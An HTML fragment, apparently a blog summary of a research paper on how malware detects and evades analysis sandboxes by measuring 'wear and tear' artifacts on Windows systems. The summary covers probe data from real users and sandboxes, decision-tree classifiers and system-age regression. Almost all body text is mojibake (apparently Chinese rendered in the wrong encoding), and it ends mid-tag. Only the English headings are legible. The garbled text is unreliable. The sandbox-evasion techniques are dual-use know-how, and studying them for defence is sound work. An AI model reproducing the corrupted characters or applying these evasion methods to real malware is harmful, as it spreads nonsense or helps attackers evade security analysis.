ç›®å‰è™šæ‹ŸåŒ–æŠ€æœ¯çš„å¹¿æ³›ä½¿ç”¨ï¼Œåº”å½“è®¤ä¸ºVMå’ŒéVMæ˜¯å…·æœ‰åŒæ ·çš„æ„ŸæŸ“ä»·å€¼çš„ï¼Œä»è€Œå‡å°‘å¯¹VMæ£€æµ‹æŠ€å·§çš„ä½¿ç”¨ï¼Œè½¬è€Œé‡‡å–å¦‚ä¸‹å‡ ç§å¯å‘å¼æ–¹æ³•:</p><ol><li>æ£€æŸ¥é¼ æ ‡å…‰æ ‡æ˜¯å¦åœ¨å±å¹•ä¸­å¤®ä¿æŒé™æ­¢ï¼›</li><li>æ˜¯å¦å­˜åœ¨â€œæœ€è¿‘æ‰“å¼€æ–‡ä»¶â€ï¼›</li><li>å¼‚å¸¸ä½æ•°é‡çš„è¿›ç¨‹ï¼›</li><li>ä¸å—é™åˆ¶çš„äº’è”ç½‘è¿æ¥ï¼Œå¹¶å°è¯•è§£æå·²çŸ¥çš„ä¸å­˜åœ¨çš„åŸŸå(æ¯”å¦‚WannaCry)ã€‚</li></ol><p>é˜²å¾¡è€…D: æˆ‘çš„ä¸¤ç§å¯¹ç­–:</p><ol><li>æ¨¡æ‹Ÿç”¨æˆ·è¡Œä¸ºï¼›</li><li>æš´éœ²æ›´çœŸå®çš„ç½‘ç»œç¯å¢ƒ</li></ol><p>é˜²å¾¡è€…Då¯¹ç­–çš„ç¼ºé™·: ç³»ç»Ÿæ­£å¸¸ä½¿ç”¨è€Œé¢„è®¡ä¼šå‘ç”Ÿç£¨æŸå’Œè€åŒ–ç‰¹å¾æœªè¢«è€ƒè™‘ã€‚</p><h3 id="C-Sandbox-Fingerprinting"><a href="#C-Sandbox-Fingerprinting" class="headerlink" title="C. Sandbox Fingerprinting"></a>C. Sandbox Fingerprinting</h3><p>SandFinger: ä½¿ç”¨ç§»åŠ¨è®¾å¤‡å±æ€§æ¥ä½œä¸ºæ²™ç®±æŒ‡çº¹æ¥è§„é¿Googleçš„Bounceræ²™ç®±ã€‚</p><p>AVLeak: ä½¿ç”¨ä¾§ä¿¡é“çš„æ–¹å¼æ•è·AVå¼•æ“ä¸­çš„æŒ‡çº¹ã€‚</p><p>SandPrint: æå–Windowsæ²™ç®±ä¸­çš„ç¡¬ä»¶é…ç½®å‚æ•°ï¼Œæ¶æ„è½¯ä»¶æ ·æœ¬è°ƒç”¨æœºåˆ¶çš„ç‰¹å¾ï¼Œå¯æ‰§è¡Œæ–‡ä»¶çš„æ–‡ä»¶åç­‰ç‰¹å¾è¿›è¡Œèšç±»åˆ†æï¼Œè¿›è€Œè¯†åˆ«æ²™ç®±ã€‚</p><p>å¦‚æœæ²™ç®±æ“ä½œå‘˜å°†æ²™ç®±çš„ç‰¹å¾å€¼è¿›è¡Œå¤šæ ·åŒ–å¤„ç†ï¼Œè‡´ä½¿æ˜¯æŒ‡çº¹å¤±æ•ˆã€‚é‚£ä¹ˆæ”»å‡»è€…ä¸‹ä¸€æ­¥ä¼šè€ƒè™‘æ€ä¹ˆæ–¹æ³•è¿›è¡Œè§„é¿? è¿™ç§æ–¹å¼å°±æ˜¯æœ¬æ–‡ä¸­æ‰€æåˆ°çš„çœŸå®ç³»ç»Ÿæ‰å…·æœ‰çš„â€œç£¨æŸâ€å’Œâ€œè€åŒ–â€ç‰¹å¾ã€‚</p><h2 id="III-WEAR-AND-TEAR-ARTIFACTS"><a href="#III-WEAR-AND-TEAR-ARTIFACTS" class="headerlink" title="III. WEAR AND TEAR ARTIFACTS"></a>III. WEAR AND TEAR ARTIFACTS</h2><p>æ–‡ä¸­é€‰ç”¨çš„artifactçš„ç‰¹ç‚¹: æ¶æ„è½¯ä»¶å¯ä»¥è½»æ¾æ¢æµ‹</p><p>artifactçš„é€‰æ‹©ç­–ç•¥: å“ªäº›åœ¨ç³»ç»Ÿçš„æ­£å¸¸ä½¿ç”¨ä¸­ä¼šè¢«å½±å“</p><h3 id="A-Probing-for-Artifacts-while-Preserving-User-Privacy"><a href="#A-Probing-for-Artifacts-while-Preserving-User-Privacy" class="headerlink" title="A. Probing for Artifacts while Preserving User Privacy"></a>A. Probing for Artifacts while Preserving User Privacy</h3><p>ä»artifactåœ°é€‰æ‹©ä¸Šæ¥çœ‹å¯ä»¥åˆ†ä¸ºä¸¤ç§:ä¸€ç§æ˜¯ç›´æ¥æºäºç”¨æˆ·æ´»åŠ¨ï¼›å¦ä¸€ç§æ˜¯æ¥è‡ªç³»ç»Ÿæ´»åŠ¨(ç”¨æˆ·æ´»åŠ¨çš„é—´æ¥è¡¨ç°)ã€‚</p><p>ç›´æ¥æ¥æºæ˜¯é’ˆå¯¹ç”¨æˆ·è¡Œä¸ºçš„å®šæ€§æŒ‡æ ‡ï¼š</p><ol><li>æ–‡æ¡£æ–‡ä»¶å¤¹æ˜¯å¦åŒ…å«å…·æœ‰é¢„æœŸæ–‡ä»¶æ‰©å±•åçš„åˆç†æ•°é‡çš„æ–‡ä»¶ï¼›</li><li>æ£€æŸ¥æµè¡Œæ–‡æ¡£æŸ¥çœ‹åº”ç”¨ç¨‹åºä¸­æœ€è¿‘æ‰“å¼€çš„æ–‡æ¡£ï¼›</li><li>æœ€è¿‘é”®å…¥çš„åœ¨çº¿æœç´¢å¼•æ“æŸ¥è¯¢ï¼›</li><li>ç³»ç»ŸèŒƒå›´çš„æœç´¢æŸ¥è¯¢</li><li>å³æ—¶æ¶ˆæ¯ï¼›</li><li>ç”µå­é‚®ä»¶æ¶ˆæ¯å†…å®¹<br>ä½†æ˜¯è¿™äº›å°†ä¼šå¯¹ç”¨æˆ·çš„éšç§é€ æˆä¾µçŠ¯ï¼Œæ‰€ä»¥æœ¬æ–‡çš„æ–¹æ¡ˆå°†ä½¿ç”¨é—´æ¥æ¥æº(æ¯”å¦‚:ç»Ÿè®¡cookieã€è®¿é—®çš„URLæ•°é‡ç­‰æ–¹å¼)</li></ol><h3 id="B-Artifact-Categories"><a href="#B-Artifact-Categories" class="headerlink" title="B. Artifact Categories"></a>B. Artifact Categories</h3><p>æœ¬æ–‡ä¸»è¦é’ˆå¯¹Windowsæ“ä½œç³»ç»Ÿè¿›è¡Œç ”ç©¶ï¼Œæ‰€ä»¥é‡‡ç”¨çš„artifactç±»åˆ«é›†åˆå¦‚ä¸‹è¡¨æ‰€ç¤º:</p><p><img src="https://i.loli.net/2019/03/20/5c91ebb3a0f41.png" alt="C8483676-8960-47A8-86DB-0BA4C555E98B.png"></p><h2 id="IV-DATA-COLLECTION"><a href="#IV-DATA-COLLECTION" class="headerlink" title="IV. DATA COLLECTION"></a>IV. DATA COLLECTION</h2><h3 id="A-Probe-Tool-Implementation"><a href="#A-Probe-Tool-Implementation" class="headerlink" title="A. Probe Tool Implementation"></a>A. Probe Tool Implementation</h3><p>ä¸ºäº†ä»çœŸå®ç”¨æˆ·ç³»ç»Ÿå’Œæ¶æ„è½¯ä»¶æ²™ç®±ä¸­æ”¶é›†ä»¥ä¸Šç±»åˆ«çš„artifactæ•°æ®é›†ï¼Œä½œè€…å®ç°äº†ä¸€ä¸ªåªä½¿ç”¨ç³»ç»ŸAPIã€ä¸éœ€è¦å®‰è£…å¹¶ä¸”å…¼å®¹Windows XPåˆ°Windows 10çš„æ¢é’ˆç¨‹åºã€‚è¿™ä¸ªç¨‹åºä¸»è¦æœ‰ä»¥ä¸‹å‡ ä¸ªç‰¹ç‚¹:</p><ol><li>ä½¿ç”¨HTTPSä¿¡é“ä¼ è¾“æ”¶é›†åˆ°çš„artifactæ•°æ®é˜²æ­¢æ²™ç®±æ‹¦æˆªè¯·æ±‚ï¼›</li><li>æ”¶é›†ä¸€äº›BIOSä¾›åº”å•†ç­‰å…¶ä»–ä¿¡æ¯ç”¨äºVMå¯å‘å¼æ£€æµ‹ï¼Œæ¥å»é™¤ç”¨æˆ·é›†ä¸­å¯èƒ½å­˜åœ¨çš„VMç»“æœé›†ï¼›</li><li>å”¯ä¸€çš„åµŒå…¥å¼IDæ¥è¯†åˆ«åŒä¸€ä¾›åº”å•†çš„å¤šæ¬¡æäº¤(ä¸€äº›ç ‚ç®±ä¼šå°†ç¨‹åºæ”¾åœ¨å¤šä¸ªä¸åŒçš„ç¯å¢ƒä¸­è¿›è¡ŒåŠ¨æ€åˆ†æï¼Œè¿›è€Œæ£€æµ‹å…¶è¡Œä¸º)ï¼›</li><li>åŸºäºæ“ä½œç³»ç»Ÿå®‰è£…æ—¥æœŸï¼ŒWindowsç‰ˆæœ¬ï¼ŒBIOSä¾›åº”å•†ç­‰ä¿¡æ¯çš„ç»„åˆæ¥åŒºåˆ†ä¸åŒçš„æ“ä½œç³»ç»Ÿã€‚</li></ol><h3 id="B-IRB-Approval-and-User-Involvement"><a href="#B-IRB-Approval-and-User-Involvement" class="headerlink" title="B. IRB Approval and User Involvement"></a>B. IRB Approval and User Involvement</h3><p>è¿™éƒ¨åˆ†ä¸»è¦è®²è¿°ä½œè€…åœ¨ç”³è¯·IRBæ‰¹å‡†ï¼Œä»è€Œè®©çœŸå®ç”¨æˆ·å‚ä¸è¿›è¿™ä¸ªé¡¹ç›®ä¸­ã€‚</p><h3 id="C-Data-Collection"><a href="#C-Data-Collection" class="headerlink" title="C. Data Collection"></a>C. Data Collection</h3><p><strong>ç¬¬ä¸€ä¸ªæ•°æ®é›†ï¼ˆDrealï¼‰-&gt;</strong> 270ä¸ªçœŸå®ç”¨æˆ·æœºå™¨ï¼Œå…¶ä¸­æœ‰89.4ï¼…æ˜¯Amazon Mechanical Turk workersã€‚å›½å®¶åˆ†å¸ƒä¸ºç¾å›½ï¼ˆ44ï¼…ï¼‰ï¼Œå°åº¦ï¼ˆ18ï¼…ï¼‰ï¼ŒGBï¼ˆ10ï¼…ï¼‰ï¼ŒCAï¼ˆ8ï¼…ï¼‰ï¼ŒNLï¼ˆ1ï¼…ï¼‰ï¼ŒPK ï¼ˆ1ï¼…ï¼‰ï¼ŒRUï¼ˆ1ï¼…ï¼‰å’Œå…¶ä»–28ä¸ªé¢‘ç‡ä½äº1ï¼…çš„å›½å®¶/åœ°åŒº(è¿™ç§å›½å®¶åˆ†æä»£è¡¨äº†ä»å‘è¾¾å›½å®¶åˆ°å‘å±•ä¸­å›½å®¶çš„è®¡ç®—æœºä½¿ç”¨ç£¨æŸç‰¹æ€§)ã€‚è¡¨IIä¸­æ˜¾ç¤ºäº†ç”¨æˆ·ç³»ç»Ÿçš„BIOSä¾›åº”å•†åˆ†å¸ƒã€‚</p><p><img src="https://i.loli.net/2019/03/20/5c91ebd9f2459.png" alt="C78622AB-6BEF-4026-BD60-443C678D64C4.png"></p><p>PS:åé¢ä½œè€…å‘ç°Amazon Mechanical Turk workersæ˜¯ä¸€ç§è·Ÿæœç´¢å¼•æ“ç›¸ç»“åˆçš„æ²™ç®±ï¼Œå› æ­¤å°†è¿™ä¸€éƒ¨åˆ†çš„æ•°æ®æ ‡è®°ä¸ºâ€œcrawlersâ€å¹¶åˆå¹¶åˆ°åé¢çš„æ²™ç®±æ•°æ®é›†ä¸­ã€‚</p><p><strong>ç¬¬äºŒä¸ªæ•°æ®é›†ï¼ˆDsandï¼‰-&gt;</strong> æ¥è‡ª15ä¸ªå¯ä»¥æ”¶é›†åˆ°ä¿¡æ¯çš„æ¶æ„è½¯ä»¶æ²™ç®±ï¼Œè¡¨IIIæ˜¯æ²™ç®±ä¸å¯¹åº”æ¢é’ˆå›æ”¶çš„ä¿¡æ¯ã€‚</p><p><img src="https://i.loli.net/2019/03/20/5c91ebf611d6b.png" alt="F93245B2-9D5E-4021-8193-C786CCB797B6.png"></p><p>PS:æœ‰çš„æ²™ç®±ç¯å¢ƒä¼šåœ¨åº•å±‚ä½¿ç”¨ä¸åŒç‰ˆæœ¬çš„æ“ä½œç³»ç»Ÿæ¥åˆ†åˆ«è¿›è¡Œåˆ†æã€‚</p><p><strong>ç¬¬ä¸‰ä¸ªæ•°æ®é›†ï¼ˆDbaseï¼‰-&gt;</strong> åŸºå‡†æ•°æ®é›†ï¼Œæ•°æ®æ¥è‡ªå¤šä¸ªå…¨æ–°å®‰è£…çš„Microsoft Windowsç‰ˆæœ¬(åŒ…æ‹¬Azureå’ŒAWSæä¾›çš„äº‘WindowsæœåŠ¡å™¨)ã€‚</p><h3 id="D-Dataset-Statistics"><a href="#D-Dataset-Statistics" class="headerlink" title="D. Dataset Statistics"></a>D. Dataset Statistics</h3><p>è¡¨IVæ˜¾ç¤ºäº†æˆ‘ä»¬ä¸‰ä¸ªæ”¶é›†çš„æ•°æ®é›†ä¸­ä¸åŒMicrosoft Windowsç‰ˆæœ¬çš„æ•°é‡ã€‚(å¯ä»¥çœ‹å‡ºæ²™ç®±çš„ç³»ç»Ÿåˆ†å¸ƒä¸çœŸå®ç”¨æˆ·çš„æ˜¯ä¸ç›¸åŒçš„)ã€‚</p><p><img src="https://i.loli.net/2019/03/20/5c91ec1191b91.png" alt="245E7896-EF5A-4113-9D57-9B52A7CBAF1C.png"></p><p>å›¾1æ˜¾ç¤ºäº†ä¸‰ä¸ªæ•°æ®é›†ï¼ˆDrealï¼ŒDsandå’ŒDbaseï¼‰ä¸­æ¯ä¸ªç£¨æŸartifactå€¼çš„åˆ†å¸ƒã€‚ä»ä¸­å¯ä»¥çœ‹åˆ°:1.å¤§å¤šæ•°artifactåœ¨çœŸå®ç”¨æˆ·ç³»ç»Ÿä¸­çš„å€¼å¤§äºæ²™ç®±å’ŒåŸºçº¿ä¸­çš„å€¼ï¼Œå› æ­¤å¯ä»¥ç”¨æ¥åŒºåˆ†çœŸå®ç”¨æˆ·å’Œæ²™ç®±ï¼›2.çœŸå®ç”¨æˆ·çš„artifactå€¼åˆ†å¸ƒæ›´å®½ï¼Œå› æ­¤å¯ä»¥ç”¨æ¥é¢„æµ‹ç³»ç»Ÿå¹´é¾„ã€‚</p><p>PS: å¯ä»¥çœ‹åˆ°æ²™ç®±çš„appdiffdayså’Œsysdiffdayså€¼æ¯”çœŸå®ç”¨æˆ·é«˜å¾ˆå¤šï¼Œå› æ­¤æ²™ç®±ç³»ç»Ÿä¸€èˆ¬æ¯”çœŸå®ç”¨æˆ·ç³»ç»Ÿâ€œè€åŒ–â€ç¨‹åº¦æ›´é«˜ã€‚</p><p><img src="https://i.loli.net/2019/03/20/5c91ec2ee2d88.png" alt="14E8B219-A888-4C3C-B543-F662C51B6938.png"></p><p>å›¾2æ˜¾ç¤ºäº†Mann-Whitney Uæ£€éªŒæ˜¾ç¤ºçš„Drealå’ŒDsandåˆ†å¸ƒä¹‹é—´å·®å¼‚çš„å½±å“å¤§å°ã€‚0.3å’Œ0.5ä¹‹é—´çš„æ•ˆæœè¢«è®¤ä¸ºæ˜¯â€œä¸­ç­‰â€æ•ˆåº”çš„ç‰¹å¾ï¼Œè€Œé«˜äº0.5çš„æ•ˆåº”è¢«è®¤ä¸ºæ˜¯â€œå¼ºâ€æ•ˆåº”ã€‚ </p><p><img src="https://i.loli.net/2019/03/20/5c91ec4613e0d.png" alt="35DDDF7E-590D-43D1-908D-68EE9F072667.png"></p><h2 id="V-EVADING-MALWARE-SANDBOXES"><a href="#V-EVADING-MALWARE-SANDBOXES" class="headerlink" title="V. EVADING MALWARE SANDBOXES"></a>V. EVADING MALWARE SANDBOXES</h2><p>ä»¥ä¸Šçš„ç»Ÿè®¡ä¿¡æ¯è¯´æ˜äº†ä½œè€…æ‰€é€‰ç”¨çš„artifactæ˜¯å¯ä»¥ä½œä¸ºç‰¹å¾æ¥åˆ†è¾¨æ²™ç®±çš„ï¼Œå› æ­¤æ¥ä¸‹æ¥å°†ä½¿ç”¨æœ‰ç›‘ç£æœºå™¨å­¦ä¹ æ–¹å¼ï¼Œè®­ç»ƒå†³ç­–æ ‘æ¨¡å‹æ¥è¿›ä¸€æ­¥å®Œæˆå¯¹æ²™ç®±çš„è§„é¿å·¥ä½œã€‚</p><h3 id="A-Setup-and-Classifier"><a href="#A-Setup-and-Classifier" class="headerlink" title="A. Setup and Classifier"></a>A. Setup and Classifier</h3><ol><li>ä½¿ç”¨å†³ç­–æ ‘æ¨¡å‹ã€‚å› ä¸ºå†³ç­–æ ‘æ¨¡å‹å¯ä»¥è¡¨ç°ä¸ºä¸€ç³»åˆ—çš„if-elseè¯­å¥ï¼Œä»è€Œå°†æ¶æ„è½¯ä»¶çš„æ•´ä½“è¶³è¿¹ä¿æŒåœ¨æœ€å°ã€‚</li><li>è®¡ç®—çš®å°”æ£®ç›¸å…³ç³»æ•°ï¼ˆrï¼‰æ¥æ£€æŸ¥ç‰¹å¾å¯¹çš„ç›¸å…³æ€§ã€‚è™½ç„¶æœ‰4å¯¹ç‰¹å¾å…·æœ‰å¾ˆå¼ºçš„ç›¸å…³æ€§ï¼ˆr&gt; 0.7ï¼‰ï¼Œä½†æ˜¯ä¸ºäº†å°½å¯èƒ½çš„è§„é¿æ‰€æœ‰æ²™ç®±ï¼Œä½œè€…è¿˜æ˜¯é‡‡ç”¨äº†æ‰€æœ‰çš„ç‰¹å¾ã€‚</li><li>è®­ç»ƒé›†ï¼š49ä¸ªæ²™ç®±ç¯å¢ƒå®ä¾‹ï¼Œ22ä¸ªæ–°å®‰è£…æ“ä½œç³»ç»Ÿçš„å®ä¾‹ï¼Œ71ä¸ªçœŸå®ç”¨æˆ·å®ä¾‹ï¼›æµ‹è¯•é›†ï¼šå‰©ä½™çš„49ä¸ªæ²™ç®±ç¯å¢ƒå®ä¾‹ï¼Œ49ä¸ªçœŸå®ç”¨æˆ·éšæœºæ ·æœ¬ã€‚</li><li>ä½¿ç”¨10-trial adaptive boostingç®—æ³•(åˆ›å»ºå¤šä¸ªæ ‘ï¼Œæ¯ä¸ªæ ‘ä¸“æ³¨æ”¹è¿›å‰ä¸€æ£µæ ‘çš„ç»“æœ)å’Œadaptive boostingå†³ç­–æ ‘ç®—æ³•(è¦†ç›–å•æ£µæ ‘ä¸èƒ½åˆ°è¾¾çš„è¾¹ç•Œ)æ¥æå‡åˆ†ç±»å™¨å‡†ç¡®æ€§ã€‚</li><li>æŒ‡å®šæˆæœ¬çŸ©é˜µå‡å°‘æ¼æŠ¥çš„å‡ºç°(åŸåˆ™æ˜¯å®å¯ä¸æ„ŸæŸ“åˆ°æŸäº›çœŸå®ç”¨æˆ·ï¼Œä¹Ÿå°½é‡ä¸èƒ½è¢«æ²™ç®±æ•è·)ã€‚</li></ol><p>PS: FP è¯¯æŠ¥-&gt;æ²¡æœ‰æ„ŸæŸ“çœŸå®ç”¨æˆ·ä¸»æœºï¼›FN æ¼æŠ¥-&gt;å°è¯•æ„ŸæŸ“æ²™ç®±</p><h3 id="B-Evaluation"><a href="#B-Evaluation" class="headerlink" title="B. Evaluation"></a>B. Evaluation</h3><p>æ¨¡å‹åœ¨æµ‹è¯•é›†ä¸Šè¾¾åˆ°äº†92.86ï¼…çš„å‡†ç¡®ç‡ï¼Œå‡é˜´æ€§ç‡ï¼ˆFNRï¼‰ä¸º4.08ï¼…ï¼Œå‡é˜³æ€§ç‡ï¼ˆFPRï¼‰ä¸º10.20ï¼…ã€‚ åä¸ªæ„å»ºçš„æ ‘çš„å¹³å‡æ ‘å¤§å°ä¸º4.6åˆ†è£‚ï¼Œæœ€çŸ­çš„æ ‘å…·æœ‰3ä¸ªåˆ†è£‚ï¼Œæœ€é•¿çš„æ ‘åˆ†è£‚ä¸º5ä¸ªã€‚ è¡¨Væ˜¾ç¤ºäº†å¯¹ç®—æ³•æœ€æœ‰ç”¨çš„åŠŸèƒ½ï¼Œä»¥åŠä½¿ç”¨ä»»ä½•ç»™å®šåŠŸèƒ½çš„æ ‘çš„ç™¾åˆ†æ¯”ã€‚</p><p><img src="https://i.loli.net/2019/03/20/5c91ec5d88eee.png" alt="A9DDAD20-0A49-4538-A0F3-82D1761AAD55.png"></p><p>ä¹‹åä½œè€…ä»ä¸¤ä¸ªæ€è·¯å‡ºå‘:<br>ä¸€ã€è¯„ä¼°æˆ‘ä»¬çš„ç®—æ³•å¯¹æ²™ç›’ç¯å¢ƒä¸­å¢é‡å˜åŒ–çš„ç¨³å¥æ€§<br>æ–¹æ³•: æ¯æ¬¡åªåˆ é™¤ä¸€ä¸ªç‰¹å¾ï¼Œå°†ä»¥ä¸Šåˆ†ç±»å™¨è®­ç»ƒè¿‡ç¨‹é‡å¤30æ¬¡ã€‚<br>ç›®çš„: å¯¹äºæ”»å‡»è€…è€Œè¨€é‡åŒ–æ¶æ„è½¯ä»¶åŒºåˆ†æ²™ç®±å’ŒçœŸå®ç”¨æˆ·çš„èƒ½åŠ›ï¼›å¯¹äºé˜²å¾¡è€…è€Œè¨€å¯ä»¥ä½¿ç”¨åœ¨æ­¤å¤„è¯†åˆ«çš„æœ€æœ‰ä»·å€¼çš„artifactç£¨æŸç¨‹åº¦æ¥æ¨¡ä»¿çœŸå®çš„ç”¨æˆ·ç³»ç»Ÿã€‚<br>æ•ˆæœ: å›¾4æ˜¾ç¤ºäº†å‡†ç¡®æ€§ï¼Œè¯¯æŠ¥ç‡å’Œæ¼æŠ¥ç‡å¦‚ä½•å˜åŒ–ã€‚å¯ä»¥çœ‹åˆ°å³ä½¿åˆ é™¤å¤šè¾¾20ä¸ªç‰¹å¾ï¼Œåˆ†ç±»å™¨çš„æ•´ä½“å‡†ç¡®æ€§ä»é«˜äº90%ã€‚</p><p><img src="https://i.loli.net/2019/03/20/5c91ec794e2f8.png" alt="5449284B-9778-47B5-AD73-8A4192F83FEF.png"></p><p>äºŒã€æ¯ç§ç±»å‹çš„å·¥ä»¶å¦‚ä½•å½±å“åˆ†ç±»å™¨çš„å‡†ç¡®æ€§<br>æ–¹æ³•: ä¸€æ¬¡ä»…ä½¿ç”¨<strong>ä¸€ç§</strong>ç±»å‹çš„å·¥ä»¶é‡æ–°è®­ç»ƒæˆ‘ä»¬çš„æ¨¡å‹ã€‚<br>ç›®çš„: è®©æ¶æ„è½¯ä»¶ä½œè€…å¯ä»¥é€‰æ‹©ä»–ä»¬æƒ³è¦å…³æ³¨çš„artifactç±»åˆ«ï¼Œä½†è¿™ç§é€‰æ‹©ä¸ä¼šå½±å“æ¶æ„è½¯ä»¶çš„è§„é¿èƒ½åŠ›ã€‚<br>æ•ˆæœ: è¡¨VIæ˜¾ç¤ºäº†æ¯ä¸ªç±»åˆ«çš„artifactæ•°é‡ä»¥åŠæ¯ä¸ªåˆ†ç±»å™¨åœ¨æµ‹è¯•æ•°æ®é›†ä¸Šçš„æ€§èƒ½ã€‚</p><p><img src="https://i.loli.net/2019/03/20/5c91ec96391e3.png" alt="7045C7A1-D656-47AB-9A00-EF01DD79BE20.png"></p><h2 id="VI-ESTIMATING-ACTUAL-SYSTEM-AGE"><a href="#VI-ESTIMATING-ACTUAL-SYSTEM-AGE" class="headerlink" title="VI. ESTIMATING ACTUAL SYSTEM AGE"></a>VI. ESTIMATING ACTUAL SYSTEM AGE</h2><p>åœ¨ä¹‹å‰çš„æ•°æ®åˆ†æä¸­ï¼Œå¯ä»¥å‘ç°æ²™ç®±ç¯å¢ƒçš„â€œè€åŒ–â€ç¨‹åº¦ä¸ç”¨æˆ·çš„çœŸå®ç¯å¢ƒæ˜¯æˆªç„¶ä¸åŒçš„ã€‚è€Œä¸”ç†è®ºä¸Šâ€œç£¨æŸâ€ç¨‹åº¦å’Œâ€œè€åŒ–â€ç¨‹åº¦åº”è¯¥æ˜¯ç›¸åŒ¹é…çš„ï¼Œå¦‚æœä¸åŒ¹é…é‚£ä¹ˆæ˜¯æ²™ç®±çš„æ¦‚ç‡åˆ™å¾ˆå¤§ã€‚å¯¹äºæ”»å‡»è€…å¯ä»¥ä½¿ç”¨è€…ä¸€ç‰¹ç‚¹è¿›è¡Œæ²™ç®±è§„é¿ï¼›å¯¹äºé˜²å¾¡è€…åˆ™å¯ä»¥å¯¹æ²™ç®±åšæ›´å¥½çš„è°ƒæ•´ã€‚</p><h3 id="A-Correlation-Between-Age-and-Artifacts"><a href="#A-Correlation-Between-Age-and-Artifacts" class="headerlink" title="A. Correlation Between Age and Artifacts"></a>A. Correlation Between Age and Artifacts</h3><p>ç›®çš„: å¾—å‡ºartifactçš„ç£¨æŸä¸ç³»ç»Ÿå¹´é¾„ä¹‹é—´çš„å…³ç³»</p><p>å›¾5æ˜¾ç¤ºäº†ç”¨æˆ·ç³»ç»Ÿå’Œæ¶æ„è½¯ä»¶æ²™ç®±â€œå¹´é¾„â€çš„ç´¯ç§¯åˆ†å¸ƒå‡½æ•°ã€‚å¯ä»¥çœ‹åˆ°å¹³å‡è€Œè¨€ç”¨æˆ·ç³»ç»Ÿæ¯”æ²™ç®±æ›´â€œæ–°â€ã€‚</p><p><img src="https://i.loli.net/2019/03/20/5c91ecb059a15.png" alt="955EEF8C-F9A3-484B-BED1-E9639103F436.png"></p><p>å›¾6æ˜¾ç¤ºäº†æŠ¥å‘Šçš„å¹´é¾„ä¸çœŸå®ç”¨æˆ·ç³»ç»Ÿçš„æ¯ä¸ªartifactç£¨æŸç¨‹åº¦ä¹‹é—´çš„çš®å°”æ£®ç›¸å…³ç³»æ•°ã€‚æ­¤å¤„å‡è®¾ä»çœŸå®ç”¨æˆ·ç³»ç»Ÿæ”¶é›†çš„æŠ¥å‘Šå¹´é¾„æ˜¯å‡†ç¡®çš„ã€‚</p><p><img src="https://i.loli.net/2019/03/20/5c91ecc913f22.png" alt="BB57F337-F65C-4E51-97DA-6D705ADBD54E.png"></p><p>è§‚æµ‹ç»“æœåˆ†æ:</p><ol><li>è®¸å¤šéå¸¸æˆåŠŸåœ°åŒºåˆ†çœŸå®æœºå™¨å’Œæ²™ç®±çš„å·¥ä»¶å®é™…ä¸Šä¸æœºå™¨çš„å¹´é¾„æ— å…³ï¼›</li><li>ä¸€äº›ä¸ç”¨æˆ·æ´»åŠ¨ç›´æ¥ç›¸å…³çš„artifactä¸èƒ½å¾ˆå¥½çš„åæ˜ ç³»ç»Ÿçš„å¹´é¾„ï¼Œæ¯”å¦‚cookieçš„æ•°é‡(ç”¨æˆ·å¯ä»¥ä¸»åŠ¨æ¸…é™¤)ï¼›</li><li>ä¸€äº›ä¸å¤ªå®¹æ˜“è¢«ç”¨æˆ·ä¿®æ”¹çš„artifactå°†è·Ÿç³»ç»Ÿå¹´é¾„æˆæ­£ç›¸å…³ï¼Œæ¯”å¦‚è¿æ¥è¿‡çš„USBæ•°é‡ã€‚</li></ol><h3 id="B-Regression"><a href="#B-Regression" class="headerlink" title="B. Regression"></a>B. Regression</h3><p>ç›®çš„: ç¡®å®šç»„åˆå®ƒä»¬çš„åŸå§‹å€¼æ¥ä¼°è®¡ç³»ç»Ÿçš„å®é™…å¹´é¾„çš„åˆé€‚æ–¹æ³•ã€‚<br>æ•°æ®é›†å¤„ç†: </p><ol><li>åˆ é™¤å…·æœ‰ç¼ºå¤±å€¼çš„artifactï¼›</li><li>åˆ é™¤ä¸¢å¤±ç‡è¶…è¿‡80ï¼…çš„artifactã€‚</li></ol><p>(1) Linear Regression:</p><ul><li>å…¬å¼: Y =Î²0+Î²1X1+Î²2X2+ â€¦ +Îµ (Xiæ˜¯ç»™å®šçš„artifactå€¼ï¼ŒÎ²iæ˜¯å¯¹åº”çš„æƒé‡ï¼ŒYæ˜¯é¢„æµ‹çš„å¹´é¾„)</li><li>æ•°æ®é›†: è®­ç»ƒï¼ˆ60ï¼…ï¼‰ï¼Œæµ‹è¯•ï¼ˆ40ï¼…ï¼‰</li><li>è¯„ä¼°: åæŠ˜äº¤å‰éªŒè¯</li><li>ç»“æœ: çœŸå®ç³»ç»Ÿçš„é¢„æµ‹å¹´é¾„çš„æœ€ç»ˆå‡æ–¹è¯¯å·®ï¼ˆMSEï¼‰æ˜¯1.88ï¼Œè€Œæ²™ç®±çš„MSEéå¸¸é«˜ï¼Œä¸º6.25ã€‚</li><li>ç»“è®º: ä½¿ç”¨artifactçš„ç£¨æŸç¨‹åº¦æ¥é¢„æµ‹ç³»ç»Ÿå¹´é¾„æ˜¯å¯è¡Œçš„ï¼Œä¹Ÿå°±æ˜¯è¯´ä½¿ç”¨é¢„æµ‹å¹´é¾„å’Œç³»ç»Ÿçš„ç”Ÿæˆå¹´é¾„çš„å¯¹æ¯”æ¥è¯†åˆ«æ²™ç®±æ˜¯å¯è¡Œçš„ã€‚</li></ul><p>PS: åæŠ˜äº¤å‰éªŒè¯ï¼Œè‹±æ–‡åå«åš10-fold cross-validationï¼Œç”¨æ¥æµ‹è¯•ç®—æ³•å‡†ç¡®æ€§ã€‚æ˜¯å¸¸ç”¨çš„æµ‹è¯•æ–¹æ³•ã€‚å°†æ•°æ®é›†åˆ†æˆåä»½ï¼Œè½®æµå°†å…¶ä¸­9ä»½ä½œä¸ºè®­ç»ƒæ•°æ®ï¼Œ1ä»½ä½œä¸ºæµ‹è¯•æ•°æ®ï¼Œè¿›è¡Œè¯•éªŒã€‚</p><p>è¡¨VIIä¸­æŠ¥å‘Šäº†æ¨¡å‹çš„ç³»æ•°åŠå…¶på€¼ã€‚ æˆ‘ä»¬çœ‹åˆ°13ç§artifactç£¨æŸç¨‹åº¦ä¸æœºå™¨çš„å¹´é¾„ç›¸å…³ï¼Œå…·æœ‰ç»Ÿè®¡å­¦æ„ä¹‰ã€‚</p><p><img src="https://i.loli.net/2019/03/20/5c91ecdfea41f.png" 